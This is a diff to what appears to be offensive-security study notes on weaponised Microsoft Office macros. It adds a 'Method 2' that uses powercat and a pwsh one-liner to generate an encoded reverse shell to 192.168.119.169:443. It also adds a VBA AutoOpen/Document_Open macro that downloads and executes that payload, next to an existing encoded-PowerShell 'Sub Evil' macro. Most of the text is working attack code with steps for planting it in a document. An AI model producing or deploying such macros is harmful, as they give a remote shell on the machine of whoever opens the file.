@@ -6,6 +6,10 @@ description: >-
 
 # Microsoft Office
 
+## Method 1
+
+
+
 Choose VIEW ribbon and selecting Macros option. We type name for the macro and in the MACROS in drop-down menu, select the name of document, then the macro will be add. When we click create, a simple macro framework will be add into our document. We have to save the document as either .docm or the older .doc format. They support embedded macros, .docx format does not.
 
 {% embed url="https://www.revshells.com/" %}
@@ -65,5 +69,39 @@ Sub Evil()
     Str = Str + "sAHUAcwBoACgAKQB9ADsAJABjAGwAaQBlAG4AdAAuAEMAbABvA"
     Str = Str + "HMAZQAoACkA"
     CreateObject("Wscript.Shell").Run Str
+End Sub
+```
+
+## Method 2
+
+{% embed url="https://medium.com/@minix9800/ms-word-macros-with-powercat-reverse-shell-58b20983e0f0" %}
+
+```python
+LHOST=192.168.119.169
+LPORT=443
+pwsh -c "iex (New-Object System.Net.Webclient).DownloadString('https://raw.githubusercontent.com/besimorhino/powercat/master/powercat.ps1');powercat -c $LHOST -p $LPORT -e cmd.exe -ge" > revshell.txt
+```
+
+You should have an encoded payload.
+
+Now
+
+1. Create a document
+2. Go to view and macros
+3. Make a name for your macro and make sure it's used for this specific document that you will be using. Now click `Create`
+
+Now copy and paste this into the VBA editor
+
+```vba
+Sub AutoOpen()
+MyMacro
+End Sub
+Sub Document_Open()
+MyMacro
+End Sub
+Sub MyMacro()
+Dim Str As String
+Str = "powershell -c ""$code=(New-Object System.Net.Webclient).DownloadString('http://192.168.119.169/revshell.txt'); iex 'powershell -E $code'"""
+CreateObject("Wscript.Shell").Run Str
 End Sub
 ```
